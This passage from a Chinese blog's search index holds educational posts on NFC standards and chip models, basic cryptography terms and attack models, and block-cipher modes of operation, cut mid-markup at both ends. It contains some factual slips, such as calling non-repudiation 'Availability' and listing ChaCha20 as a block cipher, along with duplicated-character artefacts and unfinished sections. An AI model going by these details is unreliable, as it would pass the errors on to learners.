align=\"center\">最大2KB</td>\n<td align=\"center\">最大1MB</td>\n<td align=\"center\">最大64KB</td>\n<td align=\"center\">高达 8 KB</td>\n</tr>\n<tr>\n<td align=\"center\">读写速率</td>\n<td align=\"center\">106kbps</td>\n<td align=\"center\">106kbps</td>\n<td align=\"center\">212kbps</td>\n<td align=\"center\">106-424kbps</td>\n<td align=\"center\">26.48 kbps</td>\n</tr>\n<tr>\n<td align=\"center\">价格</td>\n<td align=\"center\">低</td>\n<td align=\"center\">低</td>\n<td align=\"center\">高</td>\n<td align=\"center\">中等&#x2F;高</td>\n<td align=\"center\">低</td>\n</tr>\n<tr>\n<td align=\"center\">安全性</td>\n<td align=\"center\">数字签名保护</td>\n<td align=\"center\">不安全</td>\n<td align=\"center\">数字签名保护</td>\n<td align=\"center\">可选</td>\n<td align=\"center\">N&#x2F;A</td>\n</tr>\n<tr>\n<td align=\"center\">说明</td>\n<td align=\"center\">Topaz由Innovision公司推出</td>\n<td align=\"center\">MIFARE由NXP公司推出</td>\n<td align=\"center\">由Sony公司推出，价格比较贵</td>\n<td align=\"center\">这类芯片在出厂时就被配置好是否只读或可读写</td>\n<td align=\"center\">上海贝岭等</td>\n</tr>\n</tbody></table>\n<h2 id=\"NFC的数据交换格式\"><a href=\"#NFC的数据交换格式\" class=\"headerlink\" title=\"NFC的数据交换格式\"></a>NFC的数据交换格式</h2><p>NFC Forum定义了两个通用的数据结构用于在NFC Device之间（包括R&#x2F;W模式中的NFC Reader和NFC Tag）传递数据。这两个通用数据结构分别是NFC Data Exchange Format（简写为<code>NDEF</code>）以及NFC Record。</p>\n<p>NFC设备中的数据根据结构化格式整理为记录，称为NFC数据交换格式（NDEF）。记录包含根据记录类型定义（RTD）规范所编码的信息：</p>\n<ul>\n<li>“设备信息”，例如固件版本</li>\n<li>“文本”字符串</li>\n<li>“通用资源标识符”，例如网页URL</li>\n<li>“连接切换”，用于配对</li>\n<li>“签名”，用于验证</li>\n<li>“智能标贴”，类似于SMS消息的文本</li>\n</ul>\n<p>NDEF还定义了如何将记录封装到消息中，以便将它们传输到其他设备。所有符合NFC标准的设备都支持NDEF，无论其类型如何。<br>对于移动设备，NDEF消息由内置软件处理，它将触发设备本身的相应操作，如：</p>\n<ul>\n<li>发送电子邮件或SMS</li>\n<li>打开网页</li>\n<li>拨打电话</li>\n<li>打开特定应用程序</li>\n</ul>\n<p>NFC Forum定义和维护了完整的操作列表和RTD。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nedf.png\" class=\"\">\n\n<p>在点对点模式下，交换的数据愈发复杂，数量更庞大。数据交换根据简单NDEF交换协议（SNEP）完成，以确保高效、稳健和快速的交互。<br>SNEP使用可靠的传输层：逻辑链路控制协议（LLCP）。</p>\n<h2 id=\"NFC标准的最新进展\"><a href=\"#NFC标准的最新进展\" class=\"headerlink\" title=\"NFC标准的最新进展\"></a>NFC标准的最新进展</h2><h3 id=\"NFCIP-1-ISO-IEC-18092-ECMA-340\"><a href=\"#NFCIP-1-ISO-IEC-18092-ECMA-340\" class=\"headerlink\" title=\"NFCIP-1 &#x3D; ISO&#x2F;IEC 18092 &#x3D; ECMA 340\"></a>NFCIP-1 &#x3D; ISO&#x2F;IEC 18092 &#x3D; ECMA 340</h3><p><code>ECMA 340</code>是基础版本，被ISO接纳成为<code>ISO/IEC 18092</code>，同时在NFC Forum中被称为<code>NFCIP-1</code>，这三者就是一回事。</p>\n<p><code>ISO/IEC 18092</code>（NFCIP-1 近场通信 - 接口和协议规范）的基本内容包括：</p>\n<ul>\n<li>在RF层面，直接继承自<code>ISO 14443 Type A</code>，并且还继承自日本<code>JIS 6319-4</code>（Sony FeliCa也基于该标准）由NFC论坛3型标签标准使用）,结果是NFC设备（读取器&#x2F;写入器模式）与ISO 14443智能卡兼容。</li>\n<li>在应用层面，为实现P2P通讯，定义了<code>Active（主动）</code>和<code>Passive（被动）</code>等两种通信模式，并使用不同的命令协议来代替 <code>ISO/IEC 14443-4</code></li>\n<li>进一步的，定义了R&#x2F;W、CE、P2P等三种操作模式，从而实现NFC 设备以点对点模式与其他 NFC 设备和 NFC 标签（卡）的互操作</li>\n</ul>\n<blockquote>\n<p>NFC论坛指出，在卡模拟模式下，支持NFC的手机可以支持<code>EMV CCPS</code> v2.0规定的非接触式卡EMV支付应用要求，具体体现在American Express ExpressPay 2.0、MasterCard PayPass 2.0和Visa payWave 2.1.1。</p>\n</blockquote>\n<h3 id=\"NFCIP-2-ISO-IEC-21481-ECMA-352\"><a href=\"#NFCIP-2-ISO-IEC-21481-ECMA-352\" class=\"headerlink\" title=\"NFCIP-2 &#x3D; ISO&#x2F;IEC 21481 &#x3D; ECMA 352\"></a>NFCIP-2 &#x3D; ISO&#x2F;IEC 21481 &#x3D; ECMA 352</h3><p><code>ECMA 352</code>是<code>ISO 21481</code>的前身，定义了在相同频率13.56Mhz上运行的不同非接触技术之间的选择机制。<br>最重要的变化是，在支持根据<code>ISO/IEC 18092</code>的基础上，兼容支持<code>ISO 15693</code>。</p>\n<h3 id=\"后续演进\"><a href=\"#后续演进\" class=\"headerlink\" title=\"后续演进\"></a>后续演进</h3><p>NFC技术的发展方兴未艾，当前还在快速变化中，最新进展包含了几个正在积极申请的新标准。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-protocol-3.bmp\" class=\"\">\n\n<p>立此存照，未来可期！！！</p>\n<hr>\n<h2 id=\"附录一：NFC的核心技术标准清单\"><a href=\"#附录一：NFC的核心技术标准清单\" class=\"headerlink\" title=\"附录一：NFC的核心技术标准清单\"></a>附录一：NFC的核心技术标准清单</h2><img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-3.png\" class=\"\">\n\n<h2 id=\"附录二：NFC主流芯片型号\"><a href=\"#附录二：NFC主流芯片型号\" class=\"headerlink\" title=\"附录二：NFC主流芯片型号\"></a>附录二：NFC主流芯片型号</h2><h3 id=\"ISO-14443-Type-A\"><a href=\"#ISO-14443-Type-A\" class=\"headerlink\" title=\"ISO 14443 Type A\"></a>ISO 14443 Type A</h3><ul>\n<li>MF1 IC S20：国内常称为MIFARE Mini，原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>SLE66R35：德国英飞凌（infineon），兼容MF1 IC S50。</li>\n<li>FM11RF08：芯片厂家为上海复旦，兼容MF1 IC S50。</li>\n<li>Mifare Std 1k MF1 IC S50及其兼容卡：原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>Mifare Std 4k MF1 IC S70及其兼容卡：原装芯片厂家为荷兰恩智浦(NXP)，在一卡通方面应用普遍。</li>\n<li>Mifare Ultralight MF0 IC U1X：国内常称为U10,芯片厂家为荷兰恩智浦(NXP)，广深高速火车票为典型应用。</li>\n<li>Mifare Ultralight C：原装芯片厂家为荷兰恩智浦（NXP）。</li>\n<li>FM11RF005:芯片厂家为上海复旦,包括FM11RF005SH与FM11RF005M,上海地铁单程票、上海轮渡单程票为典型应用。</li>\n<li>FM11RF08:芯片厂家为上海复旦</li>\n<li>Mifare DESfire 2k MF3 IC D21：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3 2k。</li>\n<li>Mifare DESfire 4k MF3 IC D41：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3。南京地铁卡为典型应用。</li>\n<li>Mifare DESfire 8k MF3 IC D81：芯片厂家为荷兰恩智浦（NXP），国内常称为MF3 8k。</li>\n<li>Mifare ProX：芯片厂家为荷兰恩智浦（NXP）。不判别容量</li>\n<li>SHC1102：芯片厂家为上海华虹，上海一卡通为典型应用。</li>\n<li>Advant ATC2048-MP：芯片厂家为瑞士LEGIC。</li>\n<li>MF1 PLUS 2k：芯片厂家为荷兰恩智浦（NXP），国内常称为PLUS S。</li>\n<li>MF1 PLUS 4k：芯片厂家为荷兰恩智浦（NXP），国内常称为PLUS X。</li>\n<li>JEWEL：芯片厂家为英国innovision，国内常称为宝石卡。不读序列号。</li>\n<li>IS23SC4456：芯片厂家为美国ISSI，可兼容MF1 IC S50的CPU卡。</li>\n<li>CPU卡（兼容MF1）：芯片厂家为上海复旦、上海华虹等，可兼容MF1 IC S50的CPU卡。该类也包含FM1208M1及其它类似的芯片卡。</li>\n<li>纯CPU卡：芯片厂家为上海复旦、美国ISSI等，纯CPU卡。该类也包含FM1208、IS23SC4456中的纯CPU卡及其它类似的芯片卡。</li>\n<li>X82A：芯片厂家为北京华大，CPU卡。</li>\n</ul>\n<h3 id=\"ISO-14443-Type-B\"><a href=\"#ISO-14443-Type-B\" class=\"headerlink\" title=\"ISO 14443 Type B\"></a>ISO 14443 Type B</h3><ul>\n<li>AT88RF020：芯片厂家为美国爱特梅尔（ATMEL），广州地铁卡为典型应用。</li>\n<li>SR176：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>SRIX4K：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>SRT512：芯片厂家为瑞士意法半导体（ST），主要用于防伪识别等。</li>\n<li>ST23YR18：芯片厂家为瑞士意法半导体（ST），CPU卡。</li>\n<li>THR1064：芯片厂家为北京同方，奥运门票为典型应用。</li>\n<li>THR2408：芯片厂家为北京同方，纯CPU卡。</li>\n<li>第二代居民身份证：芯片厂家为上海华虹、北京同方THR9904、天津大唐和北京华大，第二代身份证为典型应用。</li>\n</ul>\n<h3 id=\"ISO-15693\"><a href=\"#ISO-15693\" class=\"headerlink\" title=\"ISO 15693\"></a>ISO 15693</h3><ul>\n<li>EM4135：芯片厂家为瑞士EM，主要用于票证管理、防伪识别等。</li>\n<li>ICODE SL2 ICS53&#x2F;ICODE SL2 ICS54：芯片厂家为荷兰恩智浦（NXP），国内常称为ICODE SLI-S，主要用于物流仓储、票证管理等。</li>\n<li>ICODE SL2 ICS20：芯片厂家为荷兰恩智浦（NXP），国内常称为I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>ICODE SL2 ICS50&#x2F;ICODE SL2 ICS51：芯片厂家为荷兰恩智浦（NXP），国内常称为ICODE SLI-L，主要用于物流仓储、票证管理等。</li>\n<li>Tag-it HF-1 Plus：芯片厂家为美国德州仪器（TI），国内常称为TI2048，主要用于物流仓储、票证管理等。</li>\n<li>Tag-it HF-1 Standard：芯片厂家为美国德州仪器（TI），国内常称为TI256，主要用于物流仓储、票证管理等。</li>\n<li>BL75R04：芯片厂家为上海贝岭，兼容TI 2048，主要用于物流仓储、票证管理等。</li>\n<li>BL75R05：芯片厂家为上海贝岭，兼容I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>FM1302N：芯片厂家为上海复旦，兼容I CODE 2，主要用于物流仓储、票证管理等。</li>\n<li>Advant ATC128-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>Advant ATC256-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>Advant ATC1024-MV：芯片厂家为瑞士LEGIC，主要用于一卡通等。</li>\n<li>LRI2K：芯片厂家为瑞士意法半导体（ST）。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://static.kancloud.cn/alex_wsc/android-wifi-nfc-gps\">深入理解Android：Wi-Fi、NFC和GPS卷</a></li>\n<li><a href=\"https://nfc-forum.org/our-work/specification-releases/\">NFC-Forum官方网站的技术文档列表</a></li>\n<li><a href=\"https://nfc-forum.org/our-work/compliance/certification-program/certification-register/\">获得NFC-Forum官方认证的芯片清单</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/EMV\">EMV组织的Wiki信息</a></li>\n<li><a href=\"https://lishiwen4.github.io/nfc/nfc-introduce\">NFC标准概述</a></li>\n<li><a href=\"https://www.debugger.wiki/article/html/1562511839151556\">ISO14443 &amp; ISO15693 &amp; ISO18092</a></li>\n</ul>\n<h2 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h2><ul>\n<li>[ISO14443 Overview-v5.ppt](ISO14443 Overview-v5.ppt)</li>\n<li><a href=\"tn1216-st25-nfc-guide-stmicroelectronics.pdf\">NFC技术指南</a></li>\n<li><a href=\"zh.NFC_Solutions_from_ST.pdf\">ST意法半导体公司的NFC产品说明书</a></li>\n<li><a href=\"Near_Field_Communication_with_Linux.pdf\">NFC在Linux的技术实现</a></li>\n<li><a href=\"NFC_mcs.pdf\">NFC技术综述-中华电信</a></li>\n</ul>\n"},{"title":"关于密码学的几个基本概念","url":"/2023/01/02/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","content":"<h2 id=\"密码学的-CIA-目标\"><a href=\"#密码学的-CIA-目标\" class=\"headerlink\" title=\"密码学的 CIA 目标\"></a>密码学的 CIA 目标</h2><ul>\n<li>机密性（Confidentiality）：确保数据在存储或传输中保持秘密状态</li>\n<li>完整性（Integrity）：保证数据在传输中不被篡改</li>\n<li>不可否认性（Availability）：为接收者提供担保，保证消息确实来自发送者而不是来自伪装者</li>\n</ul>\n<p>有的理论还补充了一些目标，例如：</p>\n<ul>\n<li>身份认证（Authentication）：对声明的系统用户进行身份验证</li>\n</ul>\n<p>A军给B军发送了一封加密的文件，只有B军通过密码本能看懂，这体现了机密性；<br>C军截获这封文件并篡改后发给B军，但是B军通过文件袋的印刷痕迹可以看出这个文件已经被篡改，这体现了完整性；<br>B军通过文件的印章可以看出这是A军写的，而不是C军伪造的，体现了身份验证。</p>\n<h2 id=\"Cipher-Encrypt\"><a href=\"#Cipher-Encrypt\" class=\"headerlink\" title=\"Cipher &amp; Encrypt\"></a>Cipher &amp; Encrypt</h2><p>在密码学（cryptographic）里面，encrypt &amp; decrpty 就是加密和解密，但也经常见到 cipher，而且“密码”的中文表述就更加混乱了，cipher、password、passphrase 都可以被翻译成”密码”，分析其英文单词来源：</p>\n<ul>\n<li>cipher：&#x3D;cypher（名词，暗号），后来被衍生为动词：把（消息）写成密码，也就是加密。<br>  decipher：由 cipher 衍生的反义词，即：动词，解密。<br>  进一步，明文被称为 plaintext，对应的密文则是 ciphertext</li>\n<li>password: 一般是用户设置的各种字符或者数字密码，也称作口令。</li>\n<li>passphrase: n. 密码；通行码；口令短语。也称为”密碼片语“，通常是指用于保护密钥或者其他敏感数据的一个 password</li>\n</ul>\n<h2 id=\"Key-encapsulation-Vs-Key-wrapping\"><a href=\"#Key-encapsulation-Vs-Key-wrapping\" class=\"headerlink\" title=\"Key encapsulation Vs Key wrapping\"></a>Key encapsulation Vs Key wrapping</h2><p>主要区别在于使用的是对称加密算法、还是非对称加密算法：</p>\n<ul>\n<li>密钥封装（Key encapsulation）：指使用非对称密码算法的公钥加密另一个密钥。</li>\n<li>密钥包裹（Key wrapping）：指使用对称密码算法加密另一个密钥。</li>\n</ul>\n<h2 id=\"密码攻击方式\"><a href=\"#密码攻击方式\" class=\"headerlink\" title=\"密码攻击方式\"></a>密码攻击方式</h2><p>在密码分析学中，有四大攻击方式：</p>\n<ul>\n<li>唯密文攻击：唯密文攻击是假定密码分析者拥有密码算法及明文统计特性，并截获一个或多个用同一密钥加密的密文，通过对这些密文进行分析求出明文或密钥。 在实施唯密文攻击时，只有充分掌握和利用明文信息如文字、图像、语音、计算机程序等的内在规律，才有可能根据截获的密文成功破译密码。唯密文攻击已知条件最少。经不起唯密文攻击的密码被认为是 不安全的。你可以理解为：已知密文的穷举攻击，也仅知道密文</li>\n<li>已知明文攻击：已知明文攻击指攻击者掌握了某段明文x和对应密文y。 希尔密码依赖唯密文攻击较难破解，而通过已知明文攻击则容易攻破。你可以理解为：已知部分明文及其对应的密文，进行分析破解</li>\n<li>选择明文攻击：选择明文攻击指的是一种攻击模式。攻击者拥有加密机的访问权限，可构造任意明文所对应的密文。在选择明文攻击时，密码分析者对明文有选择或控制的能力，可选择他认为有利于攻击的任何明文及其对应的密文，是一种比已知明文攻击更强的攻击方式。如果一个密码系统能够抵抗选择明文攻击，那么必然能够抵抗唯密文攻击和已知明文攻击。你可以理解为：知道明文就知道密文</li>\n<li>选择密文攻击：攻击者掌握对解密机的访问权限，可以选择密文进行解密。密码分析者对密文有选择或控制的能力，可选择他认为有利于攻击的任何密文及其对应的明文，是一种比已知明文攻击更强的攻击方式。如果一个密码系统能够抵抗选择密文攻击，那么必然能够抵抗唯密文攻击和已知明文攻击。选择密文攻击主要用于分析公钥密码体制，如针对RSA公钥密码体制的选择密文攻击。你可以理解为：知道密文就会知道明文</li>\n</ul>\n<hr>\n<p>两个常用动词：</p>\n<p>加密：cipher 或者 encrypt<br>解密：decipher 或者 decrypt<br>另外有几个名词有必要解释：</p>\n<p>cipher: 指用于加解密的「密码算法」，有时也被直接翻译成「密码」<br>cryptographic algorithm: 密码学算法，泛指密码学相关的各类算法<br>ciphertext: 密文，即加密后的信息。对应的词是明文 plaintext<br>password: 这个应该不需要解释，就是我们日常用的各种字符或者数字密码，也可称作口令。<br>passphrase: 翻译成「密码词组」或者「密碼片語」，通常指用于保护密钥或者其他敏感数据的一个 password<br>如果你用 ssh&#x2F;gpg&#x2F;openssl 等工具生成或使用过密钥，应该对它不陌生。<br>在密码学里面，最容易搞混的词估计就是「密码」了，cipher&#x2F;password&#x2F;passphrase 都可以被翻译成「密码」，需要注意下其中区别。</p>\n<hr>\n<h2 id=\"经典文献\"><a href=\"#经典文献\" class=\"headerlink\" title=\"经典文献\"></a>经典文献</h2><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-1/\">写给开发人员的实用密码学 - 系列</a></li>\n</ul>\n"},{"title":"冬至在兰州","url":"/2018/12/23/%E5%86%AC%E8%87%B3%E5%9C%A8%E5%85%B0%E5%B7%9E/","content":"<p>老孙打了好几个电话过来</p>\n","categories":["生活"],"tags":["兰州"]},{"title":"分组加密的工作模式概述","url":"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/","content":"<p>在密码学中，最基本的分类就是：对称加密 Vs 非对称加密。</p>\n<ul>\n<li>如果使用<strong>相同的密钥</strong>进行消息的加密与解密（算法不一定相同，例如函数 &amp; 逆函数），就是对称加密算法（也称为ciphers），例如：DES、3DES、AES、Blowfish、IDEA、RC5、RC6…</li>\n<li>否则，就是非对称加密算法，通常需要一个密钥对：公钥 (public key) + 私钥 (private key)，分别用于加密和解密，例如：RSA、DSA、ECC、DH…</li>\n</ul>\n<p>关于对称加密算法，可以进一步细分为：分组加密算法 Vs 流密码算法。</p>\n<ul>\n<li>流密码算法（Stream Cipher）就是将明文按字节与密钥相对应，逐位地做约定的运算（通常是 XOR ）从而获得密文流，包括 RC4 和 GSM 等</li>\n<li>分组密码算法（Block Cipher）每次只能加密固定大小的块（例如 128 位），包括 AES、ChaCha20、Twofish、IDEA、Serpent、Camelia、RC6、CAST 等</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\">流密码</th>\n<th align=\"center\">分组密码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">按比特流顺序加密，完全串行化</td>\n<td align=\"center\">按分组长度分批加密，需要处理碎片padding</td>\n</tr>\n<tr>\n<td align=\"center\">网络数据传输是典型场景</td>\n<td align=\"center\">磁盘文件加密是典型场景</td>\n</tr>\n<tr>\n<td align=\"center\">多数基于专用电路，算法种类较少</td>\n<td align=\"center\">提供软件代码实现，算法种类丰富</td>\n</tr>\n<tr>\n<td align=\"center\">速度快，CPU资源开销少</td>\n<td align=\"center\">纯软件实现消耗较多CPU资源，主流算法有指令集支持</td>\n</tr>\n<tr>\n<td align=\"center\">根据是否依赖先前的密文，分为同步&#x2F;异步模式</td>\n<td align=\"center\">通过工作模式技术转换为流密码，有的支持并行化</td>\n</tr>\n<tr>\n<td align=\"center\">加密和解密的算法一致，有利于硬件复用</td>\n<td align=\"center\">加密和解密的算法不一定相同</td>\n</tr>\n</tbody></table>\n<p>由于分组密码的长度是固定的，但明文的长度是不确定的，由此带来了两个问题：</p>\n<ol>\n<li>明文数据长度可能不等于分组长度的倍数，如何处理碎片问题，请参见附录一。</li>\n<li>加密或解密过程中可能需要多次使用密钥，这就是<strong>分组密码工作模式</strong>，也是本文的研究内容。</li>\n</ol>\n<p>从密码学的角度看，工作模式主要用于机密性保护，部分现代的工作模式还结合了身份认证，称为认证加密模式。</p>\n<blockquote>\n<p>对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。</p>\n</blockquote>\n<p>虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对RSA进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p>\n<p>注意，采用何种工作模式与具体的对称加密算法无关！<br>此外，通过某些特定的工作模式，我们甚至可以将分组密码算法转换为流密码算法！</p>\n<h2 id=\"一、ECB-模式（Electronic-codebook，电子密码本）\"><a href=\"#一、ECB-模式（Electronic-codebook，电子密码本）\" class=\"headerlink\" title=\"一、ECB 模式（Electronic codebook，电子密码本）\"></a>一、ECB 模式（Electronic codebook，电子密码本）</h2><p>ECB 模式就是传统的密码本方式，将整个明文分成若干段相同的小段，然后使用同一个密钥对每一小段进行加密，非常简单明了。<br>由于 ECB 模式每次分组处理采用完全相同的密钥，因此一旦某个分组的密文传输过程中出现误码，将导致当前分组的解密结果出现错误，但并不会影响其他分组，即支持加密和解密的并行处理。</p>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/ECB.png\" alt=\"ECB\"></p>\n<p>ECB 模式存在严重的安全隐患，相同的明文块会被加密成相同的密文块，即著名的明文攻击问题！下图演示了一个图像文件通过 ECB 模式的加密结果。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/plaintext-attack.png\" alt=\"明文攻击\"></p>\n<p>造成明文攻击的根本原因，是用单一密钥对多个明文分组进行加密，但如果仅仅使用一个或者少量的分组（例如加密密钥传输等场景），ECB 模式仍然是安全的。</p>\n<h2 id=\"二、CBC-模式（Cipher-block-chaining，密码块链接模式）\"><a href=\"#二、CBC-模式（Cipher-block-chaining，密码块链接模式）\" class=\"headerlink\" title=\"二、CBC 模式（Cipher-block chaining，密码块链接模式）\"></a>二、CBC 模式（Cipher-block chaining，密码块链接模式）</h2><p>为了解决 ECB 模式的明文攻击问题，IBM 提出了 CBC 模式，基本原理是：</p>\n<ul>\n<li>引入初始向量 IV（Initialization Vector）</li>\n<li>第一分组：<code>（IV XOR 第一个分组的明文）</code>作为加密函数的明文输入，得到第一分组的密文</li>\n<li>后续分组：<code>（上一个分组的密文 XOR 本次分组的明文）</code>作为加密函数的明文输入，依次得到本次分组的密文</li>\n</ul>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CBC.png\" alt=\"CBC\"></p>\n<p>CBC 模式有较好的保密性，是最常见的工作模式，具有以下特点：</p>\n<ol>\n<li>增加了随机数 IV，相同明文可以产生不同密文，因此可以对抗明文攻击；</li>\n<li>由于分组之间存在依赖关系（每个密文块都依赖于它前面的所有明文块），加密过程无法并行化，但解密过程可以并行化！</li>\n<li>对于文件加密场景，需要为每个文件生成并存储唯一的 IV，对文件系统管理造成不小的困难；</li>\n<li>如果出现传输错误，那么后续结果解密后可能全部错误;</li>\n<li>预初始值IV可预测，敌⽅方可构建⽔水印(watermark),可能容易受到「padding oracle」攻击</li>\n<li>适合场景：面向分组的通⽤用传输; 认证</li>\n</ol>\n<h2 id=\"三、CFB-模式（Cipher-feedback，密文反馈模式）\"><a href=\"#三、CFB-模式（Cipher-feedback，密文反馈模式）\" class=\"headerlink\" title=\"三、CFB 模式（Cipher feedback，密文反馈模式）\"></a>三、CFB 模式（Cipher feedback，密文反馈模式）</h2><p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CFB.png\" alt=\"CFB\"></p>\n<p>主要优势：可视为流密码，节省传输能⼒<br>重要缺陷：<br>业务场景：面向分组的通⽤用传输; 认证</p>\n<ul>\n<li>CFB &amp; OFB 模式同样引入了 IV，但用途有所差异。<br>  IV 用于流密码构造函数的第一次输入，同样实现”相同明文不同密文“</li>\n</ul>\n<h2 id=\"四、OFB-模式（Output-feedback-输出反馈模式）\"><a href=\"#四、OFB-模式（Output-feedback-输出反馈模式）\" class=\"headerlink\" title=\"四、OFB 模式（Output feedback, 输出反馈模式）\"></a>四、OFB 模式（Output feedback, 输出反馈模式）</h2><p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/OFB.png\" alt=\"OFB\"></p>\n<p>OFB 模式的优点在于 OFB 模式不会出现误码传播，即由于的错误而导致之后明文分组的错误，这从图 4 中可以清晰地观察到。<br>OFB模式要求在给定密钥下加密的每条消息都有一个唯一的IV。如果与此要求相反，同一个IV用于多个消息的加密，那么这些消息的机密性可能会受到损害。</p>\n<p>主要优势：与CFB相似；传输时某位错误不不会影响其他位<br>重要缺陷：抗消息流篡改攻击不不如CFB<br>业务场景：噪声信道的传输</p>\n<h2 id=\"五、CTR-模式（Counter，计数器模式）\"><a href=\"#五、CTR-模式（Counter，计数器模式）\" class=\"headerlink\" title=\"五、CTR 模式（Counter，计数器模式）\"></a>五、CTR 模式（Counter，计数器模式）</h2><p>CTR模式（ mode，CM）也被称为ICM模式（Integer Counter Mode，整数计数模式）和SIC模式（Segmented Integer Counter）</p>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CTR.png\" alt=\"CTR\"></p>\n<p>主要优势：并⾏行行性、预处理理、随机读写；可证明安全；简单性<br>重要缺陷：<br>：⾯面向分组的通⽤用传输; 高速要求</p>\n<ul>\n<li>CTR 模式的处理方式更简单，直接引入计数器 Counter 作为 IV。<br>  注意，CTR 模式的每个分组都需要将 Counter 作为输入，而非仅是第一次。</li>\n</ul>\n<h2 id=\"六、对比分析\"><a href=\"#六、对比分析\" class=\"headerlink\" title=\"六、对比分析\"></a>六、对比分析</h2><table>\n<thead>\n<tr>\n<th align=\"center\">工作模式</th>\n<th align=\"center\">ECB</th>\n<th align=\"center\">CBC</th>\n<th align=\"center\">CFB</th>\n<th align=\"center\">OFB</th>\n<th align=\"center\">CTR</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">对抗明文攻击</td>\n<td align=\"center\">否</td>\n<td align=\"center\">IV &amp; 密文</td>\n<td align=\"center\">IV &amp; 密文</td>\n<td align=\"center\">IV &amp; 密钥输出</td>\n<td align=\"center\">Counter</td>\n</tr>\n<tr>\n<td align=\"center\">转换为流密码</td>\n<td align=\"center\">否</td>\n<td align=\"center\">否</td>\n<td align=\"center\">是</td>\n<td align=\"center\">是</td>\n<td align=\"center\">是</td>\n</tr>\n<tr>\n<td align=\"center\">加密并行处理</td>\n<td align=\"center\">是</td>\n<td align=\"center\">否</td>\n<td align=\"center\">否</td>\n<td align=\"center\">否</td>\n<td align=\"center\">是</td>\n</tr>\n<tr>\n<td align=\"center\">支持随机访问解密</td>\n<td align=\"center\">是</td>\n<td align=\"center\">是</td>\n<td align=\"center\">否</td>\n<td align=\"center\">否</td>\n<td align=\"center\">是</td>\n</tr>\n</tbody></table>\n<hr>\n<p>高级加密标准（Advanced Encryption Standard: AES）是美国国家标准与技术研究院（NIST）在2001年建立了电子数据的加密规范。其是对称加解密算法的最经典算法之一，它是一种分组加密标准，每个加密块大小为128位，允许的密钥长度为128、192和256位。这里只介绍ECB、CBC、CFB和OFB四种加密模式。</p>\n<p>其实现的数据加密算法有字节代替（SubBytes）、行移位（ShiftRows）、列混淆（MixColumns）、轮密钥加（AddRoundKey）几种</p>\n<h2 id=\"二、增强的工作模式\"><a href=\"#二、增强的工作模式\" class=\"headerlink\" title=\"二、增强的工作模式\"></a>二、增强的工作模式</h2><h3 id=\"1-GCM\"><a href=\"#1-GCM\" class=\"headerlink\" title=\"1. GCM\"></a>1. GCM</h3><p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/GCM.png\" 